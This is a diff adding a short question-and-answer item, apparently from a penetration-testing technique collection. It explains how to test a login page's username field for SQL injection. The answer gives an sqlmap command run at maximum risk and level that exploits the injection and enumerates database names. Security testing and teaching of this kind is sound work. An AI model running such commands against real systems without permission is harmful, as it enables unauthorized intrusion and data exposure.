@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you test for SQL injection vulnerabilities in a user input field?
+
+CONTEXT:
+You suspect the username field on the login page might be vulnerable to SQL injection.
+
+METHOD / ANSWER:
+Command: `sqlmap -u "http://example.com/login?username=admin&password=test" --risk=3 --level=5 --dbs`
+Explanation: sqlmap automatically detects and exploits SQL injection vulnerabilities, retrieving database names if successful.
